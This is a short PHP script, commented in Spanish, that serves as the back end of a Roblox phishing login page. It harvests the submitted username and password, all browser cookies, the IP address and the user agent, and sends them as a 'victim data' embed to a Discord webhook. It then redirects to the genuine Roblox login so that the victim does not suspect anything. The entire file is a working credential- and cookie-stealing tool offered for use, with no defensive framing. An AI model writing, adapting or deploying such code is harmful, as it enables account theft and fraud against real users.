<?php
// Configuración: Pon aquí tu webhook de Discord
$webhook_url = "https://discord.com/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN";

// Capturar datos del formulario
$username = $_POST['username'] ?? 'No proporcionado';
$password = $_POST['password'] ?? 'No proporcionado';

// Capturar cookies del navegador (si las hay)
$cookies = '';
foreach ($_COOKIE as $key => $value) {
    $cookies .= "$key: $value\n";
}

// Capturar IP y User-Agent
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';

// Preparar mensaje para Discord
$data = [
    "content" => "**🔐 Nuevo login capturado**",
    "embeds" => [
        [
            "title" => "Datos de la víctima",
            "color" => 15158332,
            "fields" => [
                ["name" => "Usuario", "value" => "```$username```", "inline" => true],
                ["name" => "Contraseña", "value" => "```$password```", "inline" => true],
                ["name" => "IP", "value" => "```$ip```", "inline" => false],
                ["name" => "User-Agent", "value" => "```$user_agent```", "inline" => false],
                ["name" => "Cookies", "value" => "```$cookies```", "inline" => false]
            ],
            "footer" => ["text" => "Cookie Logger Roblox"],
            "timestamp" => date('c')
        ]
    ]
];

// Enviar a Discord
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirigir a la página real de Roblox (para que la víctima no sospeche)
header("Location: https://www.roblox.com/login");
exit;
?>
